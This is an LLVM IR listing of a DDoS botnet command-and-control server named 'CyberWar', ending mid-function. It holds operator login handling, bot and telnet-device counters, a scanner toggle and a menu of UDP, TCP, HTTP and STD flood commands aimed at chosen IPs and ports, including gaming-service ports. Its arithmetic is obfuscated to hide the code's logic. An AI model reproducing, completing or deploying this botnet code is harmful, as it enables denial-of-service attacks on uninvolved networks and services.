; ModuleID = 'host/ir_sub/CyberWar.ll'
source_filename = "server.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"\0D\0A\1B[32mLinux~: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"%c]0;Bots Connected: %d | User(s) Online: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [22 x i8] c"\1B[37mLogin ID: \1B[30m \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[37mPasscode: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"\1B[31mIP Logged, Disconnecting From Session...\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [92 x i8] c"\1B[32m  ######  ##    ## ########  ######## ########  \1B[31m##      ##    ###    ########  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##  ##  ##  ##     ## ##       ##     ## \1B[31m##  ##  ##   ## ##   ##     ## \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [92 x i8] c"\1B[32m ##         ####   ##     ## ##       ##     ## \1B[31m##  ##  ##  ##   ##  ##     ## \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ########  ######   ########  \1B[31m##  ##  ## ##     ## ########  \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ##     ## ##       ##   ##   \1B[31m##  ##  ## ######### ##   ##   \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##    ##    ##     ## ##       ##    ##  \1B[31m##  ##  ## ##     ## ##    ##  \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [158 x i8] c"\1B[32m  ######     ##    ########  ######## ##     ##  \1B[31m###  ###  ##     ## ##     ##                                                                   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"\1B[31m     _____________________________________________________________________\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"\1B[30m \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [74 x i8] c"                              \1B[37m \1B[37m[ \1B[32mYour ID: \1B[31m%s\1B[37m ]\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [84 x i8] c"                          \1B[37m \1B[37m[ \1B[32mOpen Main Menu With: \1B[31mMenu\1B[37m ]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"\1B[37mLinux~:\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"Bots\00", align 1
@.str.39 = private unnamed_addr constant [68 x i8] c"Bots Connected: [\1B[32m %d \1B[37m] | Users Online: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"Stat\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Telnet Devices: [\1B[32m %d \1B[37m] | Status: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"Menu\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"\0D\0A\1B[37m[ \1B[32mYou Have Opened The Menu, %s \1B[37m]\0D\0A\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"\1B[32m#   \1B[32m UDP Attack: \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c"\1B[32m#   \1B[32m TCP Attack: \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [56 x i8] c"\1B[32m#   \1B[32m HTTP Attack: \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [60 x i8] c"\1B[32m#   \1B[32m STD Attack: \1B[32m!* STD [IP] [Port] [Time]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"   \1B[30m \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"   \1B[32m  ---------------------------------------------------------------\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Main Menu:     \1B[31m[ \1B[32mMenu  \1B[31m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Bot Count:     \1B[31m[ \1B[32mBots  \1B[31m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Telnet Status: \1B[31m[ \1B[32mStat  \1B[31m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Logout:        \1B[31m[ \1B[32mLog   \1B[31m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Kill Attack:   \1B[31m[ \1B[32mKill  \1B[31m]\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Clear Screen:  \1B[31m[ \1B[32mClear \1B[31m]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Credits:       \1B[31m[ \1B[32mCreds \1B[31m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"Hidden\00", align 1
@.str.58 = private unnamed_addr constant [50 x i8] c"   \0D\0A\1B[32m[\1B[32m You Must Be A 1337 ;) \1B[32m]\0D\0A\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [56 x i8] c"   \1B[32m UDP - \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [60 x i8] c"   \1B[32m TCP - \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [44 x i8] c"   \1B[32m HTTP - \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [48 x i8] c"   \1B[32m STD - \1B[32m!* STD [IP] [PORT] [TIME]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Kill\00", align 1
@.str.64 = private unnamed_addr constant [19 x i8] c"\1B[32m!* KILLATTK\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"Clear\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Creds\00", align 1
@.str.68 = private unnamed_addr constant [57 x i8] c"\0D\0A\1B[34mCredits-> \1B[32mMade By Vendettxs On Instagram\0D\0A\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"Ports\00", align 1
@.str.70 = private unnamed_addr constant [98 x i8] c"\0D\0A\1B[37mPORTS: \1B[31mXBOX Services: 3074 | PSN Services: 443 | DEFAULT: 80 | DNS/Nameserver: 53\0D\0A\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"Log\00", align 1
@.str.72 = private unnamed_addr constant [40 x i8] c"Terminating Session. Logging Out ID: %s\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.78 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.80 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.81 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"FBI\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.88 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.90 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %7, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %8, align 4
  ret i32 %42
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = add i64 %7, 2293879932995919402
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, 2293879932995919402
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #8
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #8
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %50

; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, -1
  %48 = sub i32 %46, %47
  %49 = add nsw i32 %46, -1
  store i32 %48, i32* %5, align 4
  br label %30

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 %63, 852179322
  %66 = sub i32 %65, %64
  %67 = add i32 %66, 852179322
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %3, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -481076154
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -481076154
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

; <label>:17:                                     ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = sub i64 0, 10
  %21 = sub i64 %19, %20
  %22 = add i64 %19, 10
  %23 = call noalias i8* @malloc(i64 %21) #7
  store i8* %23, i8** %8, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = load i8*, i8** %4, align 8
  %26 = call i64 @strlen(i8* %25) #8
  %27 = sub i64 %26, -7821192326898191567
  %28 = add i64 %27, 10
  %29 = add i64 %28, -7821192326898191567
  %30 = add i64 %26, 10
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 %29, i32 1, i1 false)
  %31 = load i8*, i8** %8, align 8
  %32 = load i8*, i8** %4, align 8
  %33 = call i8* @strcpy(i8* %31, i8* %32) #7
  %34 = load i8*, i8** %8, align 8
  call void @trim(i8* %34)
  %35 = call i64 @time(i64* %9) #7
  %36 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %36, %struct.tm** %10, align 8
  %37 = load %struct.tm*, %struct.tm** %10, align 8
  %38 = call i8* @asctime(%struct.tm* %37) #7
  store i8* %38, i8** %11, align 8
  %39 = load i8*, i8** %11, align 8
  call void @trim(i8* %39)
  store i32 0, i32* %12, align 4
  br label %40

; <label>:40:                                     ; preds = %109, %17
  %41 = load i32, i32* %12, align 4
  %42 = icmp slt i32 %41, 1000000
  br i1 %42, label %43, label %115

; <label>:43:                                     ; preds = %40
  %44 = load i32, i32* %12, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp eq i32 %44, %45
  br i1 %46, label %64, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* %12, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %49
  %51 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %50, i32 0, i32 1
  %52 = load i8, i8* %51, align 4
  %53 = icmp ne i8 %52, 0
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %47
  %55 = load i32, i32* %7, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %64, label %57

; <label>:57:                                     ; preds = %54
  %58 = load i32, i32* %12, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %57, %54, %43
  br label %109

; <label>:65:                                     ; preds = %57, %47
  %66 = load i32, i32* %7, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %85

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* %12, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %70
  %72 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %71, i32 0, i32 0
  %73 = load i32, i32* %72, align 4
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = load i8*, i8** %6, align 8
  %80 = load i8*, i8** %6, align 8
  %81 = call i64 @strlen(i8* %80) #8
  %82 = call i64 @send(i32 %78, i8* %79, i64 %81, i32 16384)
  %83 = load i32, i32* %12, align 4
  %84 = call i64 @send(i32 %83, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %85

; <label>:85:                                     ; preds = %75, %68, %65
  %86 = load i32, i32* %12, align 4
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %86)
  %88 = load i32, i32* %12, align 4
  %89 = load i8*, i8** %4, align 8
  %90 = load i8*, i8** %4, align 8
  %91 = call i64 @strlen(i8* %90) #8
  %92 = call i64 @send(i32 %88, i8* %89, i64 %91, i32 16384)
  %93 = load i32, i32* %7, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %85
  %96 = load i32, i32* %12, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* %12, align 4
  %104 = call i64 @send(i32 %103, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  br label %108

; <label>:105:                                    ; preds = %95, %85
  %106 = load i32, i32* %12, align 4
  %107 = call i64 @send(i32 %106, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  br label %108

; <label>:108:                                    ; preds = %105, %102
  br label %109

; <label>:109:                                    ; preds = %108, %64
  %110 = load i32, i32* %12, align 4
  %111 = sub i32 %110, 757564517
  %112 = add i32 %111, 1
  %113 = add i32 %112, 757564517
  %114 = add nsw i32 %110, 1
  store i32 %113, i32* %12, align 4
  br label %40

; <label>:115:                                    ; preds = %40
  %116 = load i8*, i8** %8, align 8
  call void @free(i8* %116) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  br label %24

; <label>:24:                                     ; preds = %324, %1
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %28

; <label>:28:                                     ; preds = %318, %24
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %324

; <label>:32:                                     ; preds = %28
  %33 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i64 %35
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %36, i32 0, i32 0
  %38 = load i32, i32* %37, align 1
  %39 = xor i32 8, -1
  %40 = xor i32 %38, %39
  %41 = and i32 %40, %38
  %42 = and i32 %38, 8
  %43 = icmp ne i32 %41, 0
  br i1 %43, label %76, label %44

; <label>:44:                                     ; preds = %32
  %45 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i64 %47
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = xor i32 %50, -1
  %52 = xor i32 16, -1
  %53 = xor i32 1959292062, -1
  %54 = or i32 %51, %52
  %55 = or i32 1959292062, %53
  %56 = xor i32 %54, -1
  %57 = and i32 %56, %55
  %58 = and i32 %50, 16
  %59 = icmp ne i32 %57, 0
  br i1 %59, label %76, label %60

; <label>:60:                                     ; preds = %44
  %61 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i64 %63
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 1
  %67 = xor i32 %66, -1
  %68 = xor i32 1, -1
  %69 = xor i32 1504624875, -1
  %70 = or i32 %67, %68
  %71 = or i32 1504624875, %69
  %72 = xor i32 %70, -1
  %73 = and i32 %72, %71
  %74 = and i32 %66, 1
  %75 = icmp ne i32 %73, 0
  br i1 %75, label %95, label %76

; <label>:76:                                     ; preds = %60, %44, %32
  %77 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %77, i64 %79
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %80, i32 0, i32 1
  %82 = bitcast %union.epoll_data* %81 to i32*
  %83 = load i32, i32* %82, align 1
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %84
  %86 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %85, i32 0, i32 1
  store i8 0, i8* %86, align 4
  %87 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %88 = load i32, i32* %8, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %87, i64 %89
  %91 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %90, i32 0, i32 1
  %92 = bitcast %union.epoll_data* %91 to i32*
  %93 = load i32, i32* %92, align 1
